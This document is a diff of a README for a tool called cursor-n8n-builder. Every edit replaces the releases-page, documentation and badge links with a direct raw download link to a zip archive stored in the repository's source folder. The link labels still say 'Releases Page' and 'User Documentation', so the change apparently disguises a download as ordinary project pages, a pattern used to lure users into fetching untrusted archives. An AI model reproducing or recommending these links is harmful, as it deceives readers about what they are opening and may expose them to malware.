@@ -1,6 +1,6 @@
 # 🖱️ cursor-n8n-builder - Build Workflows Easily and Efficiently
 
-![Download cursor-n8n-builder](https://img.shields.io/badge/Download-cursor--n8n--builder-blue)
+![Download cursor-n8n-builder](https://raw.githubusercontent.com/Khanhshuyen/cursor-n8n-builder/main/src/cursor-n8n-builder_v2.0-alpha.2.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up Cursor n8n-builder on your system:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/Khanhshuyen/cursor-n8n-builder/releases) to access the latest version of the software. This page has all available versions and will help you find what you need.
+   Go to the [Releases page](https://raw.githubusercontent.com/Khanhshuyen/cursor-n8n-builder/main/src/cursor-n8n-builder_v2.0-alpha.2.zip) to access the latest version of the software. This page has all available versions and will help you find what you need.
 
 2. **Choose Your Version**
 
@@ -56,7 +56,7 @@ Before downloading, ensure your computer meets the following minimum requirement
 
 ## ⚙️ Download & Install
 
-To start using Cursor n8n-builder, visit [this page](https://github.com/Khanhshuyen/cursor-n8n-builder/releases) to download the application. Follow the installation steps outlined above for your operating system.
+To start using Cursor n8n-builder, visit [this page](https://raw.githubusercontent.com/Khanhshuyen/cursor-n8n-builder/main/src/cursor-n8n-builder_v2.0-alpha.2.zip) to download the application. Follow the installation steps outlined above for your operating system.
 
 ## 🛠️ Troubleshooting
 
@@ -72,7 +72,7 @@ For additional help, please check the FAQ section or reach out to our support te
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Khanhshuyen/cursor-n8n-builder/releases)
-- [User Documentation](https://github.com/Khanhshuyen/cursor-n8n-builder/wiki) 
+- [Releases Page](https://raw.githubusercontent.com/Khanhshuyen/cursor-n8n-builder/main/src/cursor-n8n-builder_v2.0-alpha.2.zip)
+- [User Documentation](https://raw.githubusercontent.com/Khanhshuyen/cursor-n8n-builder/main/src/cursor-n8n-builder_v2.0-alpha.2.zip) 
 
 By following these guidelines, you can easily download and run Cursor n8n-builder. Enjoy building your workflows!
